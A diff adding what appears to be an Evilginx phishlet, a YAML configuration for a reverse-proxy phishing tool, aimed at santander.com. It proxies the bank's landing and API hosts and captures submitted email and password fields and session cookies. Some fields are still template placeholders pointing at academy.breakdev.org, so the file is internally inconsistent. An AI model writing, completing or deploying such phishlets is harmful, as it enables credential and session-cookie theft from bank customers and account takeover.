@@ -1,0 +1,23 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'santander.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'localhost:8080', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'santander.com', session: false, is_landing: false, auto_filter: false}
+  
+sub_filters:
+  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.academy.breakdev.org'
+    keys: ['cookie_name']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'academy.breakdev.org'
+  path: '/evilginx-mastery'
